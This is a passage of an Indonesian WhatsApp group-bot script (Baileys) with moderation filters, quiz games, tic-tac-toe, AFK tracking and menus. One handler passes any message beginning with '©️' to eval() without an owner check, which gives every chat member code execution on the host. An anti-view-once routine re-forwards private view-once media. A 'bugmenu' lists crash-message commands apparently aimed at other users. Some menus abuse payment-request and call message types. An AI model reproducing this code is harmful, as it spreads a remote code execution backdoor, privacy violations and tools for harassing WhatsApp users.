			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			//conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Saluran WhatsApp Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah mengirimkan link Saluran di grup ini pesan berhasil delete`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//Anti Eval by ShinChan
if (AntiEval)
   if (budy.includes("messageTimestamp")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Eval Terdeteksi 」\`\`\`\n\nAdmin sedang mengeval WhatsApp, admin bebas Eval apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Eval Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena Eval sembarangan di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

 // Antiwame by ShinChan
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apa saja😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
conn.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} telah mengirimkan link wa.me dan berhasil dihapus`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`https://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apa saja😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
conn.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} telah mengirimkan link wa.me dan berhasil dihapus`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by ShinChan
  if (antiVirtex) {
  if (budy.length > 1000) {
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Virtex Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan Virtex, admin bebas send Virtex apapun`})
          await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			conn.sendMessage(from, {text:`\`\`\`「 Virtex Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan virus di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
  // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await conn.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await conn.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        //ANTISTICKER TESTING
        if (AntiSticker && isXeonMedia) {
    if(isXeonMedia === "stickerMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
         // paytod(`\`\`\`「 Sticker Detected 」\`\`\`\n\nMaaf, tapi saya harus menghapusnya, karena admin/pemilik telah mengaktifkan anti-sticker untuk grup ini`)
    return conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //antiviewonce
    if ( AntiViewOnce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
    	if (m.isBaileys && m.fromMe) return
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await conn.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}

if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

//HD FUNCTION
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	});
}
async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
//=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
conn.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
conn.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
conn.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) conn.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) conn.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) conn.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
conn.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) conn.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) conn.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
conn.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

var createSerial = (size) => {removebg
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {

let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//test auto download tiktok
/*let regex = /https:\/\/vt\.tiktok\.com\/[A-Za-z0-9]+/g;
let matches = (m.text.trim()).match(regex);
if (!matches) return false;
await replydltt(wait);
const tiktokData2 = await tryServer1(matches[0]);

        if (!tiktokData2) {
            throw 'Gagal mendownload video!';
        }

        const videoURL2 = tiktokData2.video.noWatermark;

        const videoURLWatermark2 = tiktokData2.video.watermark;

        let ppTiktok2 = '';
        if (tiktokData2.author && tiktokData2.author.avatar) {
            ppTiktok2 = tiktokData2.author.avatar;
        }

        const infonya_gan2 = `Judul: ${tiktokData2.title}\n\nUpload: ${tiktokData2.created_at}\n\nSTATUS:\n=====================\nLike = ${tiktokData2.stats.likeCount}\nKomen = ${tiktokData2.stats.commentCount}\nShare = ${tiktokData2.stats.shareCount}\nViews = ${tiktokData2.stats.playCount}\nSimpan = ${tiktokData2.stats.saveCount}\n=====================\n\nUploader: ${tiktokData2.author.name || 'Tidak ada informasi penulis'}\n( ${tiktokData2.author.unique_id} - https://www.tiktok.com/@${tiktokData2.author.unique_id} )\nBio: ${tiktokData2.author.signature}\nLagu: ${tiktokData2.music.play_url}\nResolusi: ${tiktokData2.video.ratio}\nFoto Profile: ${ppTiktok2}`;

        if (videoURL2 || videoURLWatermark2) {
            await conn.sendFile2(m.chat, videoURL2, 'tiktok.mp4', `${done}\n\n${infonya_gan2}`, m);
    } else if (tiktokData2.images) {
    for (let tt of tiktokData2.images) {
      await conn.sendImage(m.chat, tt.url, done, m);
    }
  }*/

switch(command) {
case 'menu': {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
conn.sendMessage(m.chat, { caption: menulist, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `💖𝙇𝙄𝙎𝙏 𝙈𝙀𝙉𝙐 𝘽𝙊𝙏💖`,
contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `${ownername}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/0e2b5f224fdcaf4b61d02.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})}
                    break
case 'grupmenu': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "7777777",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」
━━━━━━━━━━━━━━━━━━━━━
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )
━━━━━━━━━━━━━━━━━━━
𝐇𝐚𝐫𝐢: ${week} ${weton}
𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${date}
𝐉𝐚𝐦: ${time}
𝐉𝐚𝐦: ${wita}
𝐉𝐚𝐦: ${wit}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
━━━━━━━━━━━━━━━━━━━
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━
╰┈➤( *GROUP MENU* )
━━━━━━━━━━━━━━━━━━━
➤ welcome on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilink on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilinkch [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilinkinstagram [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antieval [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antitoxic on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ autostiker [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antivirus [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antitoxic [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushkontak (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushcontid (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ bcgc (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ hidetag (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ totag [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ kick (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ add (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendlinkgc (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editgroup close / open [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editinfo on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ join (linknya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editsubjek (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editdesk (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tagall (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ linkgroup [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ resetlinkgc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ out/leave/leavegc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ repeat [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ call [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ call2 [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sms [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ id [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ getcase [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ q [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ toonce [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ unbanned [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ resetotp [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tourl [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ runtime [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ setppbot [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ setppgc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ shutdown [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ owner [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ addprem [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ delprem [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}}}}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break

case 'bugmenu': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
×_×
Fitur hanya boleh di akses owner ${global.ownername}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
「 \`\`\`DATABASE\`\`\` 」
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *ONLY PRIVATE CHAT* 
━━━━━━━━━━━━━━━━━━━━━━
➤ oy (Bug Call New) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ bugtxt [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbug (Bug Call) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroli (Bug Troli) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugpc (Bug Invite) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugstik [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ jadikatalog (Reply Gambar/Stiker) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tokatalog [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━
  *ONLY GRUP* 
━━━━━━━━━━━
➤ oygc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbuggc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroligc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'tqto': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
